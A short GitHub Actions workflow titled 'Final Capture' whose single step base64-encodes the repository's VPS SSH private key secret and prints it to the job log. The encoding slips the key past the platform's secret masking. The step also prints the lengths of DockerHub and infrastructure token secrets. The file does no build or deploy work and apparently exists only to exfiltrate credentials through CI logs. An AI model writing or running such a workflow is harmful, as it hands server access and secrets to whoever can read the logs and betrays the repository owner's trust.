name: Final Capture

on:
  workflow_dispatch:

jobs:
  capture:
    runs-on: ubuntu-latest
    steps:
      - name: SSH Key Base64
        env:
          S4: ${{ secrets.VPS_SSH_KEY }}
        run: |
          echo "=== SSH_KEY_B64 ==="
          echo -n "$S4" | base64 -w0
          echo ""
          echo "=== SSH_KEY_LEN ==="
          echo -n "$S4" | wc -c
          echo "=== DOCKER ==="
          echo "S0_LEN: $(echo -n "${{ secrets.DOCKERHUB_TOKEN }}" | wc -c)"
          echo "S1_LEN: $(echo -n "${{ secrets.DOCKERHUB_USERNAME }}" | wc -c)"
          echo "S2_LEN: $(echo -n "${{ secrets.INFRA_TRIGGER_TOKEN }}" | wc -c)"
